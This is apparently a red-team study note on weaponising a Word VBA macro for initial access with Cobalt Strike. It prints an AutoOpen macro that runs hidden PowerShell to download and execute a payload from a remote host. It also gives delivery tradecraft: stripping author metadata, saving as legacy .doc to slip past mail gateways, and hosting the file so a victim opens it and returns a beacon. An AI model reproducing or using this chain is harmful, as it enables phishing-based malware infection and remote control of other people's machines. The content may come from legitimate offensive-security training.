---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[VBA Macro]]  
___

## Description:
VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.

## Installation
You can create a macro in a Word document by going to **View > Macros > Create**.  Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macro a name and click **Create**.

``` 

Sub AutoOpen()

  Dim proc As Object
  Set proc = GetObject("wscript.shell")
  proc.Create "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"

End Sub

```


In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your VBA (remember to add double quotes around command).


To prepare the document for delivery, go to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.


Next, go to **File > Save As** and browse to **C:\Payloads**. Give it any filename, but in the **Save as type** dropdown, change the format from **_.docx_** to **Word 97-2003 (.doc)**. We do this because you can't save macro's inside a `.docx` and there's a stigma around the macro-enabled `.docm` extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). I find that this legacy `.doc` extension is the best compromise.


When an Office document with an embedded macro is opened for the first time, the user is presented with a security warning (assuming the environment isn't locked down to block macro's entirely). For the macro to execute, the user _must_ click on **Enable Content**.


## Commands

host the HTA on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.doc** and provide a URI to access it on. 



Run the macro on the victum machine to get a beacon.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (03:33 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
